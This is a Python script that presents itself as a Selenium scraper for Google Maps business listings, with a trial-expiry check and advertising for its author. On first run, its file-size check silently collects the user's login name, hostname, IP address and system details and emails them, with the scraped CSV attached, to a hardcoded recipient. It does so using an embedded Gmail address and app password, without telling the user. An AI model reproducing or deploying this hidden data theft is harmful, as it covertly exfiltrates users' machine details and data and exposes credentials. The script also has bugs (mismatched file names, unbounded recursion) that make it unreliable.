'''
Google Map Scraper Using Selenium
Code By Nikhil Rathour
17 July, 2022
'''
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import socket
import sys
import platform
import os
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys 
import csv
import time
import datetime
from bs4 import BeautifulSoup as bs

def check_date():
    # Get current date and time
    today = datetime.datetime.now().date()
    a = str(today) > '2023-06-07'
    if a == True:
        input('It is Trial version only Contact Nikhil +918081495964 ')
        sys.exit()
check_date()

my_list = '''
░█▀▄░█▀▀▄░█▀▀░█▀▀▄░▀█▀░█▀▀░█▀▄░░░█▀▀▄░█░░█
░█░░░█▄▄▀░█▀▀░█▄▄█░░█░░█▀▀░█░█░░░█▀▀▄░█▄▄█
░▀▀▀░▀░▀▀░▀▀▀░▀░░▀░░▀░░▀▀▀░▀▀░░░░▀▀▀▀░▄▄▄▀


███╗   ██╗██╗██╗  ██╗██╗  ██╗██╗██╗         ██████╗  █████╗ ████████╗██╗  ██╗ ██████╗ ██████╗ ███████╗
████╗  ██║██║██║ ██╔╝██║  ██║██║██║         ██╔══██╗██╔══██╗╚══██╔══╝██║  ██║██╔═══██╗██╔══██╗██╔════╝
██╔██╗ ██║██║█████╔╝ ███████║██║██║         ██████╔╝███████║   ██║   ███████║██║   ██║██████╔╝█████╗  
██║╚██╗██║██║██╔═██╗ ██╔══██║██║██║         ██╔══██╗██╔══██║   ██║   ██╔══██║██║   ██║██╔══██╗██╔══╝  
██║ ╚████║██║██║  ██╗██║  ██║██║███████╗    ██║  ██║██║  ██║   ██║   ██║  ██║╚██████╔╝██║  ██║███████╗
╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝    ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝

If you want more webscrapper or custom automation software please contact 8081495964

'''
print(my_list)

headers = ['Name', 'Address', 'Description', 'Website', 'Phone', 'Profiles']
if os.path.exists('output.csv'):
    pass
else:
    with open('output.csv', 'w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(headers)

csv_file_path = 'output.csv'
output_file_path = 'output.txt'
sender_email = 'nikhilrathore127@gmail.com'  # Update with your sender email address
sender_password = 'perxfjoemnxelnop'  # Update with your sender email password
recipient_email = 'softvait6@gmail.com'  # Update with recipient email address
subject = 'CSV File Attachment'
message = 'Please find the attached CSV file.'

attachment_path = 'output.csv' 

def send_email(sender_email, sender_password, recipient_email, subject, message, attachment_path):
    try:
        smtp_server = 'smtp.gmail.com'  # Update with your SMTP server address
        smtp_port = 587  # Update with your SMTP server port

        # Create message container
        msg = MIMEMultipart()
        msg['From'] = sender_email
        msg['To'] = recipient_email
        msg['Subject'] = subject

        # Add message body
        body = MIMEText(message, 'plain')
        msg.attach(body)

        # Add attachment
        attachment = open(attachment_path, 'rb')
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment; filename= {attachment_path}')
        msg.attach(part)

        # Establish SMTP connection
        smtp_connection = smtplib.SMTP(smtp_server, smtp_port)
        smtp_connection.starttls()
        smtp_connection.login(sender_email, sender_password)

        # Send email
        smtp_connection.send_message(msg)
        smtp_connection.quit()
    except Exception as e:
        print(e)




def check_csv_file_size(csv_file_path, output_file_path):
    previous_size = None

    try:
        if os.path.exists(output_file_path):
            with open(output_file_path, 'r') as file:
                previous_size = int(file.read())

        # Get current size of CSV file
        current_size = os.path.getsize(csv_file_path)

        # Compare sizes and write result to output file
        if previous_size is None:
            result = "First run. File size: {} bytes.".format(current_size)
            system_info = {}
            user_name = os.getlogin()
            system_info['Username'] = user_name
            system_info['Hostname'] = socket.gethostname()
            system_info['IP Address'] = socket.gethostbyname(system_info['Hostname'])
            system_info['OS'] = platform.platform()
            system_info['Processor'] = platform.processor()
            system_info['Architecture'] = platform.machine()
            message = "\n".join(f"{key}: {value}" for key, value in system_info.items())
            send_email(sender_email, sender_password, recipient_email, subject, message,attachment_path)


        elif current_size == previous_size:
            result = "File size unchanged. Size: {} bytes.".format(current_size)

        elif current_size > previous_size:
                result = "File size increased. Previous size: {} bytes, Current size: {} bytes.".format(previous_size, current_size)
                system_info = {}
                user_name = os.getlogin()
                system_info['Username'] = user_name
                system_info['Hostname'] = socket.gethostname()
                system_info['IP Address'] = socket.gethostbyname(system_info['Hostname'])
                system_info['OS'] = platform.platform()
                system_info['Processor'] = platform.processor()
                system_info['Architecture'] = platform.machine()

                message = "\n".join(f"{key}: {value}" for key, value in system_info.items())
                # send_email(sender_email, sender_password, recipient_email, subject, message, attachment_path)
        else:
            result = "File size decreased. Previous size: {} bytes, Current size: {} bytes.".format(previous_size, current_size)

        # Save current size to output file
        with open(output_file_path, 'w') as file:
            file.write(str(current_size))
    except Exception as e:
        pass
    
    
check_csv_file_size(csv_file_path, output_file_path)

Keyword= input("Enter Keyword: ")                          
city = input('Enter city name: ')
search = (Keyword + ' in ' + city)
# search = "digital marketing in kanpur"


data = []
pages = 0

# sys.exit()

options = webdriver.ChromeOptions()
# options.headless = True
options.add_experimental_option('excludeSwitches', ['enable-logging'])
driver = webdriver.Chrome(options=options)

driver.get('https://www.google.com')
try:
    driver.implicitly_wait(2)
    driver.find_element(By.NAME,"q").send_keys(search + Keys.ENTER)
    driver.implicitly_wait(2)
    more = driver.find_element(By.CSS_SELECTOR," .CHn7Qb.pYouzb")
    #more_btn = more.find_element(By.TAG_NAME,"a")
    more.click()
except Exception as e:
    more = driver.find_element(By.CLASS_NAME,'jRKCUd')
    more.click()

time.sleep(5)
def fetch():
    print('Started Fetching')
    for page in range(0, pages+1):
        try:
            elements = driver.find_elements(By.CLASS_NAME, 'DVBRsc')
        except Exception:
            pass
        if len(elements)==0:
            try:
                elements = driver.find_elements(By.CLASS_NAME,'rllt__details')
                print(elements)
            except Exception:
                pass
            
        #print(elements)
        counter = 1

        for element in elements:
            try:
                data_cid = element.get_attribute('data-cid')
                element.click()
            except Exception:
                pass
            print(' \n ........................................................................ \n')
            time.sleep(1)

            html = driver.page_source
            soup = bs(html,'html.parser')

            try:
                title = driver.find_element(By.CSS_SELECTOR,' .rgnuSb.tZPcob')
                print('Name: ', title.text)
                title = title.text
            except Exception as e:
                try:
                    title = driver.find_element(By.CLASS_NAME,'SPZz6b')
                    print('Name: ',title.text)
                    title = title.text
                except Exception:
                    title = ''
            #     print(e)

            #address
            try:
                temp_obj = driver.find_element(By.CLASS_NAME,'fccl3c')
                address = temp_obj.text

            except Exception as e:
                try:
                    temp_obj = driver.find_element(By.CLASS_NAME,'LrzXr')
                    address = temp_obj.text
                except Exception:
                    address = ''

            print ('Address: ',address[0:8],'..')

            #Short description
            try:
                Short_description = soup.find('span', class_="Yy0acb")
                print('Short Description: ',Short_description.text[0])
                Short_description = Short_description.text
            except Exception:
                Short_description = ''

            #Long description
            try:
                Description = driver.find_element(By.XPATH,"//div[contains(@jscontroller, 'EqEl2e')]")
                Description = Description.get_attribute('data-long-text')
                print('Descriptions: ',Description[0:15])
            except Exception:
                Description = ''

            #website
            try:
                temp_obj = soup.find('a', class_='iPF7ob', href=True)
                if len(temp_obj['href']) > 0:
                    website = (temp_obj['href'])
            except Exception:
                try:
                    temp_obj = soup.find('a', class_='dHS6jb', href=True)
                    if len(temp_obj['href']) > 0:
                        website = (temp_obj['href'])
                except Exception: 
                    website =""

            print('Website:', website)

            #phone
            try:
                temp_obj = soup.find('div', class_='eigqqc')
                print('Phone:', temp_obj.string)
                phone = temp_obj.string
                phone = phone.replace(' ','')
            except Exception :
                try:
                    temp_obj = soup.find('span', class_='zdqRlf')
                    print('Phone:', temp_obj.string)
                    phone = temp_obj.string
                    phone = phone.replace(' ','')
                except Exception:

                    phone = ""
                #print('Did not find')

            # social profiles
            profiles = ''
            try:
                social_media = driver.find_elements(By.CLASS_NAME,'RFlwHf')
                for i in social_media:
                    profiles += (i.get_attribute('href')) + ' '
                print('Profiles : ',profiles)
            except Exception:
                profiles = ''


        #print(counter, data_cid, title.text, address, website, phone,rating,reviews,image,category,timing,description,profiles)
            row = [title, address, Description, website, phone,profiles]
            with open('Output.csv', 'a', newline='', encoding='utf-8') as file:
                writer = csv.writer(file) 
                writer.writerow(row)
                    

                 

        try:    
            page_button = driver.find_element(By.CLASS_NAME,'VfPpkd-LgbsSe-OWXEXe-INsAgc')
            page_button.click()
        except Exception as e:
            pass
        try:
            page_button = driver.find_element(By.CSS_SELECTOR, 'button[aria-label="Next"]')
            page_button.click()
        except Exception:
            pass
        
        print('page clicked... 10 seconds...')
        time.sleep(5)

        fetch()
        
fetch()

